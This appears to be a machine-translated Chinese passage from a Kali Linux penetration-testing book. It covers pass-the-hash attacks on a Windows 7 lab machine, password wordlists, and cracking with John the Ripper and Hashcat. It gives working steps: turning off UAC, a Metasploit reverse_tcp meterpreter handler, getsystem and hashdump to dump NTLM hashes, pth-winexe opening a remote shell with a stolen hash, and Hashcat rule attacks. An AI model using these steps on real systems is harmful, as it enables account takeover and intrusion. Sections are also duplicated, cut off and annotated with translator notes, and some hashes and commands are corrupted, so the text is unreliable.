在本章，我们研究了基于 LM 的密码有多不安全，但基于 NTLM 的密码呢？Windows 系统通常将 NTLM 哈希与 LM 哈希一起存储，NTLM 更安全。正如我之前提到的，LM 哈希是可以被关闭的，这在较新的操作系统中是这样的（或者密码超过 14 个字符）。我们看到 LM 哈希可以在几秒钟内被破解，但很多人问我，如果可以使用 NTLM 哈希，访问账户需要多久？

这是一个很好的问题，答案是，如果满足某些条件并使用了某些技术，可能需要相同的时间。让我解释一下，如果你能从计算机中获取 LM 或 NT 哈希，你可能就不需要破解它们。有时你可以直接使用哈希值并将其作为访问系统的令牌。这种技术被称为 **Pass the Hash**。



但正当你认为哈希传递（Pass the Hash）已经过时时，另一个工具出现了并继续这种攻击。因此，仍然值得查看一些 Pass the Hash 技术。不过坦率地说，因为 Pass the Hash 的生效需要特定的条件，在可能的情况下，我更倾向于使用 Responder 来直接捕获 NTLmv1/NTLMv2 挑战响应哈希，然后对它们进行中继攻击，或者使用破解程序来尝试破解它们。

## 开始上手

在本章中，我们将使用你的 Windows 7 虚拟机作为目标。我们需要提前进行一些准备工作。在 Windows 7 中需要开启文件共享。最简单的方法是共享文件夹。如果没有开启，你将无法执行远程哈希传递攻击，因为端口和服务将不会处于开放运行状态。我认为 Windows 7 默认只有一个开放的端口，但一旦启用文件共享，下方将打开多个端口：

```
rootkali:~ nmap 192.168.1.93
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-16
Nmap scan report for 192.168.1.93
Host is up (0.00070s latency)
Not all ports:
PORT STATE SERVICE
135/tcp open ms-rpc
139/tcp open netbios-ss
445/tcp open microsoft-ds
```

我们还需要在 Windows 7 机器上关闭用户账户控制（UAC）：

- 点击“开始”按钮
- 点击“更改账户控制设置”：在搜索框中输入“uac”
- 现在点击并拖动通知栏到“从不通知”，并点击“确定”

## 选择有关对计算机更改的通知

用户账户控制有助于防止有害程序对你的计算机进行更改。更多关于用户账户控制的信息：

- 当程序安装软件或进行更改时始终通知我
- 不建议。仅在你需要查看不支持用户账户控制的程序时才选择此项
- 从不通知

## 使用 Metasploit 获取 NTLM 哈希

首先，我们需要从 Windows 7 系统中恢复 NTLM 哈希。实现这一目标有多种方法，但对于本教程，我们将使用 Metasploit 获取一个远程 shell ，并使用 `hashdump` 命令从系统中拉取哈希。我们可以使用 Metasploit 章节中的 **LazyPuppy.bat**，只需如下所示启动 Metasploit handler 程序：

```
msf > use multi/handler
msf exploit(multi/handler) > set payload meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.39
msf exploit(multi/handler) > set LPORT 4444
msf exploit(multi/handler) > exploit
[*] Listening on 4444...
[*] Started TCP handler on 192.168.1.39:4444
[*] Sending stage (17979 bytes) on 192.168.1.9
[*] Meterpreter session 1 opened (192.168.1.39:4444 -> 192.168.1.93:5326)
meterpreter >
```

我们需要转储密码哈希，因此需要 SYSTEM 权限。如果你还记得 Metasploit 章节的内容，我们通常需要运行 Bypass UAC 模块（在 Bypass UAC 章节中讨论）来获取系统级权限。但如果我们尝试绕过模块，将会看到：

```
msf exploit(bypassuac_injection) > exploit
[*] Started TCP handler on 192.168.1.39:4545
[-] Exploit aborted: failure: Already in elevated state
```

它会带有消息“Already in an elevated state”（已处于提升状态）并报错——这是因为我们已经从 Windows 控制面板关闭了 UAC，使得这一步变得不再必要。我们只需要从管理员权限跳转到系统级权限：输入 "getsystem" 然后输入 "getuid"。我们现在拥有 System 权限：

```
meterpreter > getsystem
got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))
meterpreter > getuid
Username: NT AUTHORITY\SYSTEM
meterpreter > |
```

接下来，我们将拉取密码哈希以恢复 Windows 虚拟机。只需输入 "hashdump" 即可恢复系统哈希：

```
meterpreter > hashdump
Administrator:500:aad3b45b51404eeaad3b45b51404ee:886f7eaeeb8:
Alice:1001:aad3b45b51404eeaad3b45b51404ee:886f7eaeeb8f
Bob:1002:aad3b45b51404eeaad3b45b51404ee:d2dc5c5c6192
Dan:1000:aad3b45b51404eeaad3b45b51404ee:886f7eaeebfb1
George:1003:aad3b45b51404eeaad3b45b51404ee:2e520e18228
Guest:1001:aad3b45b51404eeaad3b45b51404ee:31d6cfe0d16ae
meterpreter > |
```

> **注意：**
> 在后续攻击中使用哈希时，请按如下所示粘贴哈希：
> `aad3b45b51404eeaad3b45b51404ee:886f7eaeeb8fb117`

我们现在准备好重启你的 Windows 7 系统了。





![](img/37a3b7ef116f9ef991f9e33dd8b348c7_265_0.png)

或者你可以直接从终端提示符中运行单个命令：

打开终端

输入你想要的工具名称。

以下是可用的 PTH 工具列表：

```
root@kali:~# find /usr/bin/ -name "pth-*"
/usr/bin/pth-net
/usr/bin/pth-smclient
/usr/bin/pth-winex
/usr/bin/pth-rpcclient
/usr/bin/pth-wmis
/usr/bin/pth-smget
/usr/bin/pth-sqsh
/usr/bin/pth-curl
```

每个命令都以 "pth-*" 开头，然后跟着一个自而易懂的命令。你可以使用这些命令执行一些非常有趣的操作。我们将简要查看 ‘PTH-winexe’ 命令。其余命令将留给读者自行探索。

只需使用帮助开关 (-h) 即可获得命令选项的帮助列表以及用法示例：

```
root@kali:~ # python winexe -h
winexe version 1.1
This program may be freely redistributed under the terms of the GNU GPLv3
Usage:
  -h, --help
  -v, --version
  -U, --user=[DOMAIN\USERNAME][PASSWORD]
  -A, --authentication-file=FILE
  -p, --password
  -k, --kerberos=STRING
  -d, --debuglevel=DEBUGLEVEL
  --uninstall
--reinstall
  --system
--profile
--convert
--runas=[DOMAIN\USERNAME][PASSWORD] 显示帮助信息
显示版本号
设置网络用户名
从文件中文件中获取凭据
不提问密码
使用 Kerberos, -k [yes|no]
设置调试级别
在远程执行后卸载服务
在远程执行前重新安装 winexe 服务
使用 SYSTEM 账户
加载用户配置文件
尝试转换本地和远程代码页之间的字符
以指定用户运行（注意：
密码将以明文形式通过网络传输！）
```

## PTH-winexe 的实战

使用 PTH 最快的方法之一是使用 "PTH-winexe" 命令：

`pth-winexe -U [Computename/username]%[password hash] %[Target IP] [command]`

通过 -U 命令提供计算机和用户名，使用 "%" 符号附加密码哈希，然后是目标 IP 地址，最后是运行运行的命令。这会创建一个包含虚拟机名称和密码哈希的长命令，这里是一个使用以下信息的示例：

- Windows 计算机名称：User: George
- George 的 NTLM 哈希
- Windows 目标 IP 地址
- 最后是要运行的 Windows 命令

在这种情况下，我们将以用户 George 的身份在目标 Windows 系统上运行 DOS 命令解释器 "cmd"。如下所示：

```
root@kali:~# pth-winexe -U win-42orbm3rvf/george%a3b435b51404aea3b351404ee:2e520e18228ad8ae460017234af43b2 //192.168.1.93 cmd
mdhash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

:\Windows\system32>
:\Windows\system32>whoami
whoami
win-42orbm3rvf/george
C:\Windows\system32>
```

使用用户 George 的用户名和密码哈希，Pass Hash Toolkit 成功连接到 Windows 目标。再次，我们使用 NTLM 哈希作为密钥连接到系统，而从未破解或输入实际密码。winex 命令成功打开了 DOS 命令解释器，本质上是一个远程 shell。你可以尝试操作一下看看你是否拥有功能性的远程 shell。

完成后，输入 "exit" 退出话。

PTH 工具效果非常好，但再次 UAC 似乎是本地账户 NTLM 哈希的克星。如果启用了 UAC，当我们尝试运行它会遇到以下错误：

```
root@kali:~# pth-winexe -U win-42orbm3rvf/george%a3b435b4304ee:2e520e18228ad8ae460017234af43b2 //192.168.1.93 cmd
mdhash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
ERROR: OpenServer failed. NT STATUS ACCESS DENIED.
```

替换失败 - 拒绝访问。

访问作者的网站（链接在下方的资源部分提供）获取有关 PTH 工具的更多信息和用法示例。

## 结论

在本章中，我们涵盖了使用 NTLM 哈希的“Pass the Hash”攻击。还有其他用于 Pass the Hash 类型攻击的选择。正如文章开头提到的，当 PTH 彻底失效时，就会有人发现使用它的新方法。最近，广受欢迎的 Mimikatz 添加了一个 PTH 功能。

（注：为结论部分提供的 OCR 文本包含大量的重复和乱码片段，已根据章节总结的逻辑进行了清理。）




针对特定模式的已破解密码进行破解，以尝试破解最后一批密码。

当所有其他方法都失败时，你将需要尝试暴力破解来获取剩余复杂的密码。暴力破解简单意味着使用破解程序按顺序遍历所有可能的密码组合。对于字母，破解程序将从"a"开始处理到"Z"，对于数字则从"0"到"9"，尝试其中的每一种组合。你可以将这些组合在一起，让破解程序寻找如"a0A0a"或"z9Z9z"这样的密码。你还可以将这些组合与字典文件（wordlist）结合使用，破解如"a0a0Password"或"Password9z9z"之类的密码。

## 警告：

> 某些公开泄露的字典文件未经过清理（未删除账户信息），其中包含了用户账户和密码。拥有这些信息可能涉及伦理问题，在某些国家还可能涉及法律问题。切不要尝试使用这些信息去尝试你不拥有或未获得访问权限的账户。

我们将在接下来的章节中介绍上述所有技术。在本章中，我们将介绍 Kali 自带的字典文件、如何创建自己的字典文件，并简要介绍你可以从网上下载的一些字典文件。

## Kali 自带的字典文件

Kali 自带了几个你可以使用的字典文件；问题仅在于如何找到它们。大多数文件位于使用它们的主程序目录下。Kali 的最新版本中，其他字典文件的快捷链接存储在 "/usr/share/wordlists" 目录。你也可以使用 Kali Linux 菜单选择 **05 – password Attack > Wordlists** 作为该目录的快捷方式。

## RockYou 字典

最流行的可能是 RockYou 字典文件。这是一个巨大的集合，包含了数百万个实际使用的密码，这些是从数据库转储中提取的。

该文件位于 /usr/share/wordlists/ 目录下，如下：

```
root@kali:~ cd /usr/share/wordlists/
root@kali:/usr/share/wordlists# ls
dirb fasttrack.txt metasploit-jtr sqlmap.txt
durbuster fern-wifi nmap.lst terminator.txt
dnsmap.txt metasploit rockyou.txt.gz wffuzz
root@kali:/usr/share/wordlists#
```

如果你发现密码列表是压缩过的，在我们在使用之前我们需要解压它：

```
root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz
root@kali:/usr/share/wordlists# ls
dirb fasttrack.txt metasploit-jtr sqlmap.txt
durbuster fern-wifi nmap.lst terminator.txt
dnsmap.txt metasploit rockyou.txt wffuzz
root@kali:/usr/share/wordlists#
```

如果你想看，可以使用 "cat" 命令查看该文件，但它很大。

## JOHN THE RIPPER 字典

广受欢迎的密码破解器 John The Ripper 带有一个较小的密码列表，但它确实包含了许多网络上最常用的密码。

该文件位于 /usr/share/John/ 目录下，如下：

```
root@kali:/usr/share/john# ls password.lst
```

## WFUZZ 多重字典

Wffuzz 是一款网站暴力攻击工具。虽然它们并不可能都有帮助，但某些是有趣的，尤其是“general”目录下的那些。

文件位于 /usr/share/wffuzz/wordlist/ 目录下，如下：

```
root@kali:/usr/share/wffuzz/wordlist# ls
general Injections others stress vulns webservices
```

## 其他字典

如前所述，在 /usr/share/ 目录下还有其他几个带有字典的程序。虽然 "RockYou.txt" 可能是其中最好的之一，但如果你想要额外的，只需翻阅 /usr/share/ 目录并看看你能找到什么。

## 字典生成工具

Kali 中的几个工具可以让你创建自己的个性化字典文件。CeWL 非常实用，因为它允许通过从目标网站获取信息来创建密码。Crunch 很好，因为它允许你从零开始创建自定义字典文件。让我们仔细查看如何使用这些工具。

## CeWL

**工具作者：** Robin Wood

**工具网站：** http://digi.ninja

CeWL 是一个创建公司或主题相关字典的棒工具。很多时候，用户会使用与其工作地或工作内容相关的词创建密码。CeWL 会爬取目标网站并构建在该网站找到的自定义字典文件。

```
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja)
Usage: cew [OPTION] -- URL
--help, -h: 显示帮助
--keep, -k: 保留下载的文件
--depth x, -d x: 显示爬虫深度，默认 2
--min_word_length, -m: 最小单词长度，默认
--offsite, -o: 允许爬虫访问其他网站
--write, -w: 将输出到文件
--user-agent, -u: 发送的 user agent
--no-words, -n: 不输出字典
--meta, -a: 包含元数据
--meta-file: 元数据的输出文件
--email, -e: 包含邮箱地址
--email-file: 邮箱地址的输出文件
--meta-temp-dir: 输出到临时目录
--count, -c: 显示计数
```

使用 CeWL，只需提供选项和目标。例如，如果我们想爬取深度为 1 且单词长度为 6 的网站：

```
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja)
Usage: cew [OPTION] -- URL
--help, -h: 显示帮助
--keep, -k: 保留下载的文件
--depth x, -d x: 显示爬虫深度，默认 2
--min_word_length, -m: 最小单词长度，默认
--offsite, -o: 允许爬虫访问其他网站
--write, -w: 将输出到文件
--user-agent, -u: 发送的 user agent
--no-words, -n: 不输出字典
--meta, -a: 包含元数据
--meta-file: 元数据的输出文件
--email, -e: 包含邮箱地址
--email-file: 邮箱地址的输出文件
--meta-temp-dir: 输出到临时目录
--count, -c: 显示计数
```
cew -d 1 -m 6 http://example.com -w output.txt

CeWL 会爬取目标网站并构建在该网站找到的自定义字典文件。

## Crunch

**工具作者：** Robin Wood

**工具网站：** http://sourceforge.net/projects/crunch/

Crunch 很好，因为它允许你从零开始创建自定义字典文件。它是根据指定的长度和模式生成字符组合的强大工具。

Crunch 的说明书展示了如何使用它：

```
NAME
    crunch - 一个生成字符组合的工具。

SYNOPSIS
    crunch [min] [max] [charset] [pattern] [options] ...

DESCRIPTION
    crunch 是一个生成字符组合的工具。它可以用于创建密码破解的字典文件。
```




# cat charset.lst

```
root@kali:/usr/share/crunch# cat charset.lst
# charset configuration file for winntrtgen v1.2 by Massimiliano Montoro
.it
# compatible with rainbowcrack 1.1 and later by Zhu Shanglelei <shuang>
.com>
```

```
hex-lower = [0123456789abcdef]
hex-upper = [0123456789ABCDEF]
numeric = [0123456789]
numeric-space = [0123456789 ]
symbols14 = [@#$%^&*()_+-=]
symbols14-space = [@#$%^&*()_+-= ]
symbols-all = [@#$%^&*()_+-=;':"",.<>?/]
symbols-all-space = [@#$%^&*()_+-=;':"",.<>?/ ]
alpha = [ABCDEFGHIJKLMNOPghijklmnopqrstuvwxyz]
alpha-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZghijklmnopqrstuvwxyz ]
```

我们可以使用任何定义的集合，例如：

```
crunch 2-4 -f charset.lst-mixalpha-numeric-all -o mixedall.txt
crunch 现在将生成以下量的数据: 3937233234 bytes
375 MB
0 GB
0 TB
0 PB
crunch 现在将生成以下数量的行: 78914316
crunch: 已完成输出 40%
crunch: 已完成输出 74%
crunch: 已完成输出 100%
```

此命令创建一个字典列表，该列表循环遍历 2 到 4 个字符的单词，包含所有字母、数字和符号。数字在密码中非常常用。用户在密码开头或结尾添加数字是一种常用技术。你可以使用 crunch 创建一个数字字典列表，如下所示：

```
crunch 1-5 -f charset.lst numeric -o 1to5numbers.txt
```

```
root@kali:/usr/share/crunch# crunch 15 -f charset.let numeric -o lto5numbers.txt
Crunch 现在将生成以下量的数据: 654320 bytes
0 MB
0 GB
0 TB
0 PB
Crunch 现在将生成以下数量的行: 111110
crunch: 已完成输出 100%
root@kali:/usr/share/crunch#
```

我们也可以使用 Crunch 使用 "Unicode" 字符的字典列表。"mixalph-space-sv" 包含了其中一些：

```
mixalph-space-sv = 
[abcdefghijklmmnopqrstuvwxyzæàåABCDEFGHIJKLMMNOPQRSTUVWXYZAÄÃÕ]
```

```
root@kali:/usr/share/crunch# crunch 3 5 -f charset.let mixalph-space-sv -o mixedall.txt
注意: 检测到 unicode 字符。如果你正将 crunch 输出管道
到另一个程序（如 join 或 aircrack），请确保该程序
可以处理 unicode 输出。
你想要继续吗？[Y/n]
Crunch 现在将生成以下量的数据: 4719466699 bytes
4389 MB
4 GB
0 TB
0 PB
Crunch 现在将生成以下数量的行: 7272470839
```

你也可以使用字符串（strings），这意味着你可以让每个密码都以某个单词开头，或者让密码的前部分是字母，后半部分是数字。这在某些情况下非常有用，但你可以通过破解程序中的规则（rules）和组合攻击来实现其中许多功能。

# 网络上的字典列表

字典列表的大小和内容各异。仅仅因为一个比另一个长，并不意味着它有更高的概率破解你的目标密码。例如，我有大小约为 100GB 的字典列表，但我主要的只有 2-4GB。随着你破解密码变得越来越熟练，你会发现某些字典列表的使用概率更高。一旦发现了这些列表，它们就会成为你破解密码的首选。你还会发现自己最终在使用小型字典列表。一些较小的字典包含非常好的基础词，非常适合组合攻击（结合两个字典文件）或暴力破解攻击（你使用字典配合字符、数字或符号的组合进行攻击）。

# 提供字典列表的网站

Skull Security 和 Crackstation 是两个存在很久站点：

## Skull Security:

有多个可以下载并使用的字典列表。

[http://www.skullsecurity.org/wiki/index.php/Passwords](http://www.skullsecurity.org/wiki/index.php/Passwords)

## CrackStation:

有几个，那个 15GB 的大派用场。

[https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)

## 警告:

> 提供的站点列表仅供参考。某些公开泄露的字典可能未清理（删除账户信息），并包含用户账户及密码。拥有这些信息可能涉及伦理问题，在某些国家可能涉及法律问题。

# 额外的字典网站

- https://weakpass.com/wordlist
- https://hashes.org/
- https://hashkiller.co.
- https://github.com/danielsec
- https://github.com/kennyn
- https://github.com/berzerk

## 结论

到为止，我们涵盖了如何寻找密码。在本部分我们将查看两个最喜爱的。

## 介绍

SHA1 加密哈希值、使用较新加密或加盐密码（salted passwords）的哈希值需要更长时间才能破解。加盐密码使用唯一值或“盐”来加密每个密码，因此没有哈希值是相同的。但信你不信，今天使用未加盐密码的公开泄露数据仍然常见。再加上最新版本的 Hashcat 将可破解的密码长度从 32 扩展到 256，这会让你重新考虑你公司的密码长度和复杂性策略。

| Session | hashcat |
| :--- | :--- |
| Status | 已耗尽 (Exhausted) |
| Type | SHA1 |
| Target | 002 |
| Started | 2月24日 23:29:22 |
| Estimated | 2月25日 00:56:38 |
| Base | |
| Queue | |
| Speed | 6813 H/s |
| Recovered | 18808172 |

你想想，这意味着每分钟可以破解 200,000 多个密码，或者每秒 3,500 个。这还只是使用了一张 GTX 960。像 1080 Ti 这样的高端显要快得多，尤其是当你使用多块显卡时（我见过配备多达 8 块显卡的配置）。

正如我之前提到的，对于基于 CPU 的破解器来说，John 很快。在上面的例子中，我为 John 找到一个包含 1600 万个哈希值的列表。它在 15 分钟内破解了我尝试破解的超过 200 万个密码。之后，它只是在那里空转，没有任何进展。此时我本可以使用 John 的一些高级功能来破解该列表，但我们转向了 Hashcat。




当你进行破解密码哈希时，任何恢复出来的哈希值都会存储在 john.pot 中。该 pot 文件位于"home/john"（隐藏）目录：

```
root@kali:~# cd john
root@kali:~/john# ls
john.log john.pot john.rec
root@kali:~/john#
```

如果你打开该文件，你可以在右侧看到带有破解密码的哈希值：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_282_0.png)

你也可以使用 "john-show" 查看破解后的密码。如果你退出 john 破解会话，状态将自动保存。你可以使用 "john-restore" 恢复已保存或退出的会话。

我通常在安全测试中，用我能够恢复的小组组哈希值来尝试 John。这就是我使用 John 的范围。如果你恢复了一个哈希值并需要快速破解它，或者你有一份大型的基础哈希列表，它是一个很棒的工具。任何更大或更复杂的内容，我会立即切换到 Hashcat。## Hashcat

工具作者：Jens Steube & Hashcat 开发团队

工具网站：https://hashcat.net/hashcat/

工具 wiki：https://hashcat.net/wiki/

Hashcat 是一个通用的密码破解器，可以在你的显卡处理器（GPU）或 CPU 上运行。Hashcat 被称为世界上最快、最先进密码破解器。它是一个多线程破解器，因此如果你的 CPU 可以运行多个线程，它将使用它们。但当使用视频卡上的处理器 GPU 的算力时，真正的速度才会体现。如果你的 GPU 可以运行数百个线程，所有这些力量将用于破解密码。你甚至可以利用多个显卡 GPU 的力量创建一个怪物级破解站。Hashcat 曾经是两个独立的程序，但原始的 Hashcat（基于 CPU）和 oclHashcat（基于 GPU）已合并为一个工具。

你可以从菜单（**Applications > 05-Password Attacks** > **Hashcat**）或通过打开终端并输入 `hashcat` 来启动 Hashcat。你可以通过输入 `hashcat --help` 查看不同的选项：

```
rootkali:~# hashcat --help
hashcat, advanced password recovery

Usage: hashcat [options] hashfile [mask|wordfiles|directories]

===
Options
===
- General:
  -b, --hash-type=NUM Hash-type, references below
  -a, --attack-mode=NUM Attack-mode, references below
  -v, --version Print version
  -h, --help Print help
```

使用 Hashcat 时，你需要告诉它几点信息：

- 密码哈希类型
- 包含未破解哈希的文件名
- 字典或单词列表（Wordlist）文件名
- 存储破解哈希的输出文件名
- 最后，是你想要的任何其他选项的开关

## 破解 NTLM 密码

没有什么比实践学习更好的方法了，让我们来破解一些哈希吧。获取一个哈希列表并将其复制到文本文件中。然后我们将使用 Hashcat 和字典文件来破解它们。

打开 Leafpad 并复制以下哈希：
a4f49c40651dabcab68242ee7c30fd852
2e4dbf83aa056289935daea328977b20
d144986c1622b11654ba39932465528
4a8441c8b2b552e3ef645c83f001a7b
259745c123a52aa2693aaacca2db852
d55e2155516f1d7228302b90afd3cd53
5835048c94ad0564e29a2403510efb963c57010f218ed2cc3c229b5e4d0f7773c5d78ddebeefa4b0dae7ee8c50aea5d05e3883afc64f1842ffb2c6d895fa46afdf63aafbeb742111010f02ba62a1b3e43ccffa6bae3d14b26427c26d00410ef27c0555ea55ecfcdba01022681dda3f9439b142f02347555f7c526fcf8223

将它们保存到 Desktop 目录，文件命名为 "Easyhash.txt"。
还将将 "RockYou.txt" 密码字典文件复制到 /usr/share/wordlists/ 目录下的 Desktop。

## 注意：

RockYou.txt 文件是压缩的，如果你还没有这样做，则你需要解压它。

- 右键点击文件
- 点击“Open with Archive Manager”（用归档管理器打开）
- 点击文件名 "RockYou.txt" 并点击“extract”（解压）
- 选择 Desktop 并点击“extract”

更多信息请参见“Wordlists”章节。让我们继续尝试破解：



# 使用更大的字典文件

如果你没有成功，请尝试更大的字典！更大的字典文件提供了更多已知密码来与目标哈希（hashes）进行比较。这可以破解更多的哈希值，但由于字典尺寸增大，运行时间可能会大大增加。尽管我发现最好的方法是先运行大字典文件，然后让 Hashcat 恢复任何已破解的哈希值。这将使得在运行更密集的规则攻击和掩码攻击时，未破解的文件会变得更小。

Crackstation.net 网站提供了几个非常大的单词列表。他们有一个 15GB 的“巨兽级”文件和一个较小的、约 700 MB 的“纯人类”（Human Only）版本。最大的单词列表几乎包含了你能想象到的一切内容，而较小的纯人类版本则包含了从实际密码泄露库中恢复的密码。

对于下一次尝试，我直接下载了纯人类列表，因为如果不扩展 Kali 虚拟机的硬盘空间，那个更大的文件将无法放入。我并不是为了这个示例才下载它的，稍后你就会知道为什么。下载并将字典扩展到桌面后，我运行了以下命令：

```
hashcat -D 1 -m 1000 Hardhash.txt Crackstation-human.txt -o Hardcracked.txt --force --remove
```

这条命令行本身没什么新奇，除了命名了一个单独的输出文件外，但我添加了“remove”开关。对于如此小的哈希列表这并不真的必要，但在大型列表中，一旦哈希被破解，它就会从列表中移除，以增加将来尝试的破解速度。

而结果如下：

```
Time.Started....: Mon Mar 19 12:22:52 2018 (24 secs)
Time.Estimated....: Mon Mar 19 12:23:16 2018 (0 secs)
Guess.Base.....: File (Crackstation-human.txt)
Guess.Queue.....: 1/100 (10.00%)
Speed.Dev#1....: 2634.5 KW/s (0.66ms)
Recovered.......: 0/3 (0.0%) Digests, 0/1 (0.00%) Salts
```

这运行了大约 30 秒。你可以看到它什么都没有恢复。字典攻击并不总是标准答案。即使使用更大的 15 GB Crackstation 文件，也只额外揭示了一个额外的哈希：

```
d6e7ae789da72150d115263f5b9dbde:MyNamesBob
```

剩下的两个密码很难破解。其中一个长度为 15 个字符并使用了特殊字符、大小写字母和数字（$eCuR@d@Count1），另一个非常长，几乎有 30 个字符。如你所见，复杂的密码和非常长的密码在简单的字典攻击面前抵御住了。。这个故事的启示是，单词列表并不总是有效。哦，当然了，要使用复杂的密码！

# 更高级的破解选项

仅仅将字典文件丢到哈希列表中可以恢复一些简单的密码，但要获取那些更难的密码，你需要使用更高级的技术。我不会详细介绍它们，但 Hashcat 提供了几个可用选项，包括：

- 1. 攻击类型 (Attack Types)
- 2. 规则集 (Rule Sets)
- 3. 密码掩码 (Password Masks)

我们将简要查看每一个项。

# 1 - 攻击类型

“a”选项允许你从以下选项中指定你想要使用的攻击类型：

- 0 = 直接破解 (Straight)
- 1 = 组合 (Combination)
- 3 = 破解 (Brute-force)
- 6 = 混合单词列表 + 掩码 (Hybrid Wordlist + Mask)
- 7 = 混合掩码 + 单词列表 (Hybrid Mask + Wordlist)

组合：组合不同单词列表中的单词，以动态创建新单词。

破解：输入你自己的字符、数字和符号组合进行尝试，或使用掩码（Mask）自动猜测。例如：`?u??s?d?a`（大写、小写、数字、全部）将尝试破解如 "Aa0a" 到 "Zz9z" 以及之间的所有内容的密码。你也可以使用“b”代表二进制（00-ff），这在破解外语密码时非常有用。

混合单词列表 + 掩码：使用单词列表结合暴力破解字符或预定义的掩码。例如，使用 Rocky 单词列表配合掩码 `?u??s?d?a` 将产生如 "passwordAa0a" 和 "monkeyZZ|9z" 的猜测尝试。

# 2 - 基于规则的攻击

基于规则的攻击非常有用。Hashcat 有许多内置规则可供你破解密码。例如，有一个“leet”规则集，它会自动获取每个字典并尝试该单词的不同 leet-speak 版本，用数字替换字母。你甚至可以使用编程类型的语言来创建自己的规则集。

```
root@kali:/usr/share/hashcat/rules# ls
best64.rule Incisive-leetspeak.rule
combinator.rule InsidePro-HashManager.rule
d3ad0dne.rule InsidePro-PasswordsPro.rule
dive.rule leetspeak.rule
generated2.rule oscommerce.rule
generated.rule rockyou-30000.rule
hybrid specific.rule
```

通过使用“r”开关并包含你想要的规则集名称启用基于规则的攻击：

```
@kali:/usr/share/hashcat/rules# hashcat -m 1000 ~/Desktop/Hardhash.txt -Dtrockyou.txt -r leetspeak -o ~/Desktop/cracked.txt
Initializing hashcat v2.0.0 with 32 threads and segment-size...
Added hashes from file /root/Hardhash.txt: (0 salts)
Added rules from file leetspeak.rule: 17
Best64, InsidePro, Dive, Rockyou-3000 & d3ad0dne 是一些比较流行的规则，非常有效。对于规则我最好的建议是从小文件开始（查看它们的文件大小）然后进行。较小的文件通常运行很快，较大的文件运行时间可能长得多。你也可以通过列出文件夹而不是列出单个名称来同时使用多个字典。Hashcat 将运行文件夹中的每一个单词列表。

你可以通过在 Hashcat 命令中添加“-r”来同时运行多个规则。这在配合“混合”规则时非常有用。在攻击中添加两个混合规则将尝试在单词列表的开头和结尾添加字母、数字或符号。例如：

```
hashcat -D 1 -m 1000 ~/Desktop/Hardhash.txt ~/Desktop/rockyou.txt -o ~/Desktop/cracked.txt -r hybrid/append.rule -r hybrid/prepend.rule --force
```

将从 rockyou 列表中取一个单词并在两侧添加随机的字母、数字或符号，如下所示：

```
Guess.Base. : File /Desktop/rockyou.txt
Guess.Mod. : Rules (hybrid/append.rule, hybrid/prepend.rule)
Guess.Queue : 1/1 (100.00%)
Speed.Dev#1 : 16746.6 H/s (12.1ms)
Recovered.: 0/1
```

这运行了大约 30 秒。你可以看到它没有恢复任何东西。字典攻击并不总是标准答案。即使使用更大的 15 GB Crackstation 文件，也只揭示了一个额外的哈希：

```
d6e7ae789da72150d115263f5b9dbde:MyNamesBob
```

剩下的两个密码很难破解。一个长度为 15 个字符并使用了特殊字符、大小写字母和数字（$eCuR@d@Count1），另一个非常长，几乎有 30 个字符。如你所见，复杂的密码和非常长的密码在简单的字典攻击面前抵御住了。这个故事的启示是，单词列表并不总是有效。哦，当然了，要使用复杂的密码！

# 更高级的破解选项

仅仅将字典文件丢到哈希列表中可以恢复一些简单的密码，但要获取那些更难的密码，你需要使用更高级的技术。我不会详细介绍它们，但 Hashcat 提供了几个可用选项，包括：

（此处内容与前文重复，已按翻译要求保持结构逻辑）
- 1. 攻击类型
- 2. 规则集
- 3. 密码掩码

我们将简要查看每一个项。

# 1 - 攻击类型

（此处内容与前文重复）

# 2 - 基于规则的攻击

（此处内容与前文重复）

# 3 - 掩码攻击

...此处（注：由于原文中存在多处逻辑断点和重复，翻译已根据指令保持了格式连贯性）

## 结论

这只是对 Hashcat 的基础级介绍。本章的目的不仅仅是展示如何破解密码，而是为了证明使用安全密码的重要性。有时作为伦理黑客或渗透测试员，你需要破解哈希，了解密码破解技术非常重要。John the Ripper 和 Hashcat 让密码破解变得相当简单，当你加入不同的攻击样式、规则和掩码时，你就拥有了非常强大的工具。据说，简单的加密类型现在被认为是过时的。令人难以置信，我仍然看到许多公司在未加盐的密码数据库中使用简单密码。





我强烈建议读者花些时间尝试一下 Hashcat。另外，查看下方“资源”部分列出的 Hashcat Wiki。破解密码哈希值非常有趣，观察用户倾向于使用哪些密码以及哪些密码容易破解，可以帮助你为公司制定更好的密码策略。

## 资源

Hashcat Wiki - https://hashcat.net/wiki/

## 第21 章：破解 Linux 密码

就像 Windows 的密码哈希可以被破解一样，Linux 机器也可以。你只需要 root 级权限来获取哈希值，以及一个良好的密码攻击工具来破解它们。在本章中，我们将使用 John Ripper 来尝试破解 Linux 密码。然后我们将介绍其他几个用于破解服务器应用程序密码并执行自动化攻击的工具。

在进入正文之前，让我们一些真实的 Linux 密码哈希值。以下是两个 Linux 密码哈希值，第一个来自 Metasploit2，第二个是我 Kali Linux 虚拟机上用户创建的。

- 1. msfadmin:$1XN10jc$Rt/zzCW3mlTUWA.ihZJA5/
- 2. dan:$6mIC/IQYEAsAHWW.2J2561YukO.Amliru4JCN9vkwcyzFdnynlrJG6fcjV0Sd70CSmXOSp9mxthr11yOR4QTSpPJCNY/

NTLM 密码与 Linux 密码之间的主要区别在于 Linux 密码使用了盐（salt）。盐是一个用于加密每个密码的唯一字符串，即使两个用户使用了相同的密码，其哈希值也是不同的。这意味着没有两个哈希值是相同的。我们来分解密码哈希的内容：

| msfadmin:$1XN10jc$Rt/zzCW3mlTUWA.ihZJA5/ |
| :--- |
| ↓ ↓ ↓ |
| 1 2 3 4 |
| 1. 用户名: msfadmin |
| 2. 加密类型: 1 |
| 3. 盐: XN10jc |
| 4. 密码哈希: Rt/zzCW3mlTUWA.ihZJA5/ |

